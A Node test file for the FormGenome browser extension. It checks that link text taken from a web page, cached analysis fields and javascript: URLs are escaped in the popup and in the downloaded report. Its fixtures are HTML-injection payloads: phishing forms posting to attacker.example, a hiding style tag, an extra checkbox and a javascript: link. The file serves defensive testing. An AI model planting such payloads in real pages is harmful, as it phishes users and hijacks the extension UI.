/**
 * HTML injection in the extension PDF list.
 *
 * These tests load each extension copy's real content script and popup scripts
 * and connect them the way the popup does: chrome.tabs.sendMessage of
 * { type: 'SCAN_FOR_PDFS' }. Chrome delivers that response with JSON
 * serialization (https://developer.chrome.com/docs/extensions/mv3/messaging/,
 * "Serialization"). The stand-in below does the same JSON round-trip and does
 * not rewrite strings.
 *
 * The page under test is parsed by jsdom 25.0.1 (parse5 7.3.0). Link text is
 * read back with Node.textContent (jsdom Node-impl.js), which is the same
 * field content.js stores. The popup assigns that string to Element.innerHTML,
 * which jsdom parses with parse5.parseFragment (jsdom
 * lib/jsdom/browser/parser/html.js parseFragment, called from
 * lib/jsdom/living/domparsing/InnerHTML-impl.js).
 *
 * Expectations describe the fixed behavior. They fail while link text, the
 * cached entity, or a non-http(s) link URL is inserted into HTML unescaped.
 *
 * Not covered here:
 * - FormGenome_Extension_Firefox/popup/popup.js calls showPdfListMode but that
 *   function is not defined in the file, so that copy never builds the list.
 * - dashboard.js and team-dashboard.js escape entity_name with escapeHtml
 *   before innerHTML. They are a different path.
 */

const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');
const { JSDOM } = require('jsdom');

const ROOT = path.resolve(__dirname, '..');

const COPIES = [
  'popup-root',
  'FormGenome_Extension_Final_Fixed',
  'FormGenome_Extension_Data_Fix',
  'FormGenome_Extension_Batch_Fix',
  'FormGenome_Extension_Clean',
  'FormGenome_Extension_Final_Debug',
  'FormGenome_Extension_Normalization_Fix',
  'extracted_chrome_share'
];

// Visible text of the attacker's anchor. The page source stores it as HTML
// character references so the page DOM does not already contain these elements.
// content.js then reads the decoded textContent.
const LINK_MARKUP = '<form class=injected-phish action="https://attacker.example/collect" method=POST><button type=submit>Review and sign</button></form><style>.pdf-item{visibility:hidden}</style><input type=checkbox class=injected-extra>';

// Same sink, reached because the link text contains a form keyword
// ("application") rather than because the URL ends in .pdf.
const KEYWORD_MARKUP = '<form class=injected-keyword action="https://attacker.example/keyword" method=POST><button type=submit>Review application</button></form>';

// Stored analysis field. renderPdfList interpolates cached.entity, and the
// report generator interpolates the same value into the downloaded HTML.
const ENTITY_MARKUP = '<form class=injected-entity action="https://attacker.example/entity" method=POST><button type=submit>Entity label</button></form>';

const DIRECT_PDF_URL = 'https://attacker.example/files/report.pdf';
const KEYWORD_URL = 'https://attacker.example/landing';
const SCRIPT_URL = 'javascript:void(0).pdf';
const BENIGN_URL = 'https://attacker.example/files/annual.pdf';
const BENIGN_TEXT = 'Annual report';

function copyPaths(name) {
  if (name === 'popup-root') {
    return {
      content: path.join(ROOT, 'content/content.js'),
      html: path.join(ROOT, 'popup/popup.html'),
      config: path.join(ROOT, 'config.js'),
      popup: path.join(ROOT, 'popup/popup.js'),
      report: path.join(ROOT, 'popup/reportGenerator.js')
    };
  }
  return {
    content: path.join(ROOT, name, 'content/content.js'),
    html: path.join(ROOT, name, 'popup/popup.html'),
    config: path.join(ROOT, name, 'config.js'),
    popup: path.join(ROOT, name, 'popup/popup.js'),
    report: path.join(ROOT, name, 'popup/reportGenerator.js')
  };
}

function encodeText(value) {
  return value
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

function hashUrlFromSource(source) {
  const match = source.match(/function hashUrl\(url\) \{\r?\n[\s\S]*?\n\}/);
  assert.ok(match, 'popup.js must define hashUrl so the cache key can be seeded');
  return new Function(`${match[0]}\nreturn hashUrl;`)();
}

function attackerPage(contentSource) {
  return `<!DOCTYPE html>
<html>
<body>
  <a href="${DIRECT_PDF_URL}">${encodeText(LINK_MARKUP)}</a>
  <a href="${KEYWORD_URL}">${encodeText(KEYWORD_MARKUP)}</a>
  <a href="${SCRIPT_URL}">Statement</a>
  <a href="${BENIGN_URL}">${BENIGN_TEXT}</a>
  <script>${contentSource}</script>
</body>
</html>`;
}

function inlinePopup(html, files) {
  const config = fs.readFileSync(files.config, 'utf8');
  const popup = fs.readFileSync(files.popup, 'utf8');
  const report = fs.readFileSync(files.report, 'utf8');
  return html
    .replace('<script src="../config.js"></script>', `<script>\n${config}\n</script>`)
    .replace('<script src="popup.js"></script>', `<script>\n${popup}\n</script>`)
    .replace('<script src="reportGenerator.js"></script>', `<script>\n${report}\n</script>`);
}

function installContentChrome(window) {
  const listeners = [];
  window.chrome = {
    runtime: {
      lastError: undefined,
      sendMessage(_message, callback) {
        if (typeof callback === 'function') callback();
      },
      onMessage: {
        addListener(fn) {
          listeners.push(fn);
        }
      }
    }
  };
  window.__listeners = listeners;
  // validatePdfUrl() uses fetch for links that are not direct PDFs.
  // Nothing in this test is allowed to leave the machine.
  window.fetch = () => Promise.reject(new Error('network disabled'));
  // The content script also watches the page with MutationObserver and sends
  // PDF_LINKS_UPDATED. The popup never renders that message; it renders the
  // SCAN_FOR_PDFS reply, which calls the same findPdfLinks(). A live observer
  // only races teardown of the test window.
  window.MutationObserver = class {
    observe() {}
    disconnect() {}
    takeRecords() { return []; }
  };
}

// Chrome tabs.sendMessage resolves to the listener's sendResponse value after
// JSON serialization. See the file header.
function deliverScan(contentWindow) {
  return new Promise((resolve, reject) => {
    const listeners = contentWindow.__listeners || [];
    assert.ok(listeners.length > 0, 'content script did not register a message listener');
    let settled = false;
    const finish = (value) => {
      if (settled) return;
      settled = true;
      resolve(JSON.parse(JSON.stringify(value)));
    };
    let asyncResponse = false;
    for (const listener of listeners) {
      const keep = listener({ type: 'SCAN_FOR_PDFS' }, { id: 'popup' }, finish);
      if (keep === true) asyncResponse = true;
    }
    if (!asyncResponse && !settled) finish(undefined);
    setTimeout(() => {
      if (!settled) reject(new Error('content script did not answer SCAN_FOR_PDFS'));
    }, 2000);
  });
}

function installPopupChrome(window, storage, contentWindow) {
  window.chrome = {
    runtime: {
      lastError: undefined,
      getURL(path) {
        return `chrome-extension://formgenome/${path}`;
      },
      sendMessage(_message, callback) {
        if (typeof callback === 'function') callback();
      },
      onMessage: { addListener() {} }
    },
    storage: {
      local: {
        async get(keys) {
          if (keys == null) return JSON.parse(JSON.stringify(storage));
          if (typeof keys === 'string') {
            return Object.prototype.hasOwnProperty.call(storage, keys)
              ? { [keys]: JSON.parse(JSON.stringify(storage[keys])) }
              : {};
          }
          const out = {};
          for (const key of keys || []) {
            if (Object.prototype.hasOwnProperty.call(storage, key)) {
              out[key] = JSON.parse(JSON.stringify(storage[key]));
            }
          }
          return out;
        },
        async set(items) {
          Object.assign(storage, items);
        },
        async clear() {
          for (const key of Object.keys(storage)) delete storage[key];
        }
      }
    },
    tabs: {
      async query() {
        return [{ id: 1, url: 'https://attacker.example/library' }];
      },
      async sendMessage(_tabId, message) {
        if (!message || message.type !== 'SCAN_FOR_PDFS') {
          throw new Error(`unexpected popup message: ${message && message.type}`);
        }
        return deliverScan(contentWindow);
      }
    },
    downloads: {
      download(_options, callback) {
        if (typeof callback === 'function') callback(1);
      }
    }
  };
  window.alert = () => {
    throw new Error('popup called alert');
  };
  window.confirm = () => false;
}

async function waitForItems(document, timeoutMs) {
  const start = Date.now();
  let stable = 0;
  let last = -1;
  while (Date.now() - start < timeoutMs) {
    const count = document.querySelectorAll('#pdfItems .pdf-item').length;
    if (count > 0 && count === last) {
      stable += 1;
      if (stable >= 3) return count;
    } else {
      stable = 0;
      last = count;
    }
    await new Promise((resolve) => setTimeout(resolve, 30));
  }
  return document.querySelectorAll('#pdfItems .pdf-item').length;
}

function assertMarkupStaysText(document, marker) {
  const element = document.querySelector(`.${marker}`);
  assert.equal(
    element,
    null,
    `${marker} was parsed as an element inside the extension popup`
  );
  const needle = `<form class=${marker}`;
  const holders = [...document.querySelectorAll('#pdfItems *')].filter((node) =>
    [...node.childNodes].some((child) => child.nodeType === 3 && child.nodeValue.includes(needle))
  );
  assert.ok(holders.length > 0, `expected the ${marker} markup to be visible as text`);
  for (const holder of holders) {
    assert.equal(
      holder.querySelector(`.${marker}`),
      null,
      `${marker} markup created child elements`
    );
  }
}

for (const name of COPIES) {
  test(`${name}: page link text and cached entity are not parsed as popup HTML`, async () => {
    const files = copyPaths(name);
    const contentSource = fs.readFileSync(files.content, 'utf8');
    const popupSource = fs.readFileSync(files.popup, 'utf8');
    const hashUrl = hashUrlFromSource(popupSource);

    const contentDom = new JSDOM(attackerPage(contentSource), {
      url: 'https://attacker.example/library',
      runScripts: 'dangerously',
      beforeParse(window) {
        installContentChrome(window);
      }
    });

    try {
      const scanned = await deliverScan(contentDom.window);
      assert.equal(scanned.isPdfPage, false);

      const direct = scanned.pdfs.find((pdf) => pdf.url === DIRECT_PDF_URL);
      const keyword = scanned.pdfs.find((pdf) => pdf.url === KEYWORD_URL);
      const scripted = scanned.pdfs.find((pdf) => pdf.url === SCRIPT_URL);
      const benign = scanned.pdfs.find((pdf) => pdf.url === BENIGN_URL);

      assert.ok(direct, 'direct PDF link was not returned by the content script');
      assert.equal(direct.text, LINK_MARKUP);
      assert.ok(keyword, 'keyword link was not returned by the content script');
      assert.equal(keyword.text, KEYWORD_MARKUP);
      assert.ok(scripted, 'javascript URL ending in .pdf was not returned');
      assert.equal(scripted.url, SCRIPT_URL);
      assert.ok(benign, 'benign PDF link was not returned');
      assert.equal(benign.text, BENIGN_TEXT);

      const storage = {
        [`analysis_${hashUrl(direct.url)}`]: {
          success: true,
          complexity_score: 3,
          confidence_tier: 'High<form class=injected-tier action="https://attacker.example/tier" method=POST></form>',
          title: '',
          entity: ENTITY_MARKUP,
          _cached_at: Date.now()
        }
      };

      const popupHtml = inlinePopup(fs.readFileSync(files.html, 'utf8'), files);
      const downloaded = [];
      const popupDom = new JSDOM(popupHtml, {
        url: 'chrome-extension://formgenome/popup/popup.html',
        runScripts: 'dangerously',
        beforeParse(window) {
          installPopupChrome(window, storage, contentDom.window);
          window.URL.createObjectURL = (blob) => {
            downloaded.push(blob);
            return 'blob:captured';
          };
          window.URL.revokeObjectURL = () => {};
          // jsdom 25's Blob has no text() reader. Keep the parts the report
          // passed to the constructor; that string is the HTML the popup built.
          window.Blob = function Blob(parts, options) {
            this.parts = parts || [];
            this.type = (options && options.type) || '';
          };
        }
      });

      try {
        const count = await waitForItems(popupDom.window.document, 4000);
        assert.ok(count >= 3, `popup rendered ${count} rows; expected the scanned http(s) links`);

        const doc = popupDom.window.document;
        assertMarkupStaysText(doc, 'injected-phish');
        assertMarkupStaysText(doc, 'injected-keyword');
        assert.equal(doc.querySelector('#pdfItems style'), null, 'link text created a style element');
        assert.equal(
          doc.querySelector('input.injected-extra'),
          null,
          'link text created an extra checkbox'
        );
        const rows = [...doc.querySelectorAll('#pdfItems .pdf-item')];
        assert.equal(
          doc.querySelectorAll('#pdfItems input[type="checkbox"]').length,
          rows.length,
          'link text added a checkbox inside the PDF list'
        );

        const entityHolder = doc.querySelector('.pdf-item-entity');
        assert.ok(entityHolder, 'cached entity was not shown');
        assert.equal(doc.querySelector('.injected-entity'), null, 'cached entity was parsed as HTML');
        assert.match(entityHolder.textContent, /<form class=injected-entity/);
        assert.equal(entityHolder.querySelector('*'), null, 'cached entity created child elements');

        const status = doc.querySelector('.pdf-item-status');
        assert.equal(doc.querySelector('.injected-tier'), null, 'cached confidence tier was parsed as HTML');
        assert.match(status.textContent, /<form class=injected-tier/);
        assert.equal(status.querySelector('*'), null, 'cached confidence tier created child elements');

        const benignLink = [...doc.querySelectorAll('a.form-link')].find((node) =>
          node.textContent === BENIGN_TEXT
        );
        assert.ok(benignLink, 'benign link text was not shown');
        assert.equal(benignLink.getAttribute('href'), BENIGN_URL);

        const hrefs = [...doc.querySelectorAll('#pdfItems a, #pdfItems [data-url]')]
          .map((node) => node.getAttribute('href') || node.getAttribute('data-url') || '');
        for (const href of hrefs) {
          assert.match(
            href,
            /^https?:\/\//,
            `popup used a non-http(s) URL from the page: ${href}`
          );
        }

        const benignRow = [...doc.querySelectorAll('#pdfItems .pdf-item')].find((row) =>
          row.textContent.includes(BENIGN_TEXT)
        );
        assert.ok(benignRow);
        assert.equal(benignRow.querySelector('input[type="checkbox"]').checked, true);

        const realSetTimeout = popupDom.window.setTimeout.bind(popupDom.window);
        popupDom.window.setTimeout = (fn, delay, ...args) => {
          if ((delay || 0) >= 1000) return 0;
          return realSetTimeout(fn, delay, ...args);
        };
        popupDom.window.document.getElementById('generateReport').click();
        assert.equal(downloaded.length, 1, 'report generator did not build a download');
        const reportHtml = downloaded[0].parts.map(String).join('');
        const report = new JSDOM(reportHtml);
        try {
          const reportDoc = report.window.document;
          assert.equal(
            reportDoc.querySelector('.injected-phish, .injected-entity'),
            null,
            'downloaded report parsed link text or entity markup'
          );
          assert.match(reportDoc.body.textContent, /<form class=injected-phish/);
          assert.match(reportDoc.body.textContent, /<form class=injected-entity/);
          const reportLinks = [...reportDoc.querySelectorAll('a')].map((node) => node.getAttribute('href'));
          for (const href of reportLinks) {
            assert.match(href, /^https?:\/\//, `report used a non-http(s) URL: ${href}`);
          }
        } finally {
          report.window.close();
        }
      } finally {
        popupDom.window.close();
      }
    } finally {
      contentDom.window.close();
    }
  });
}
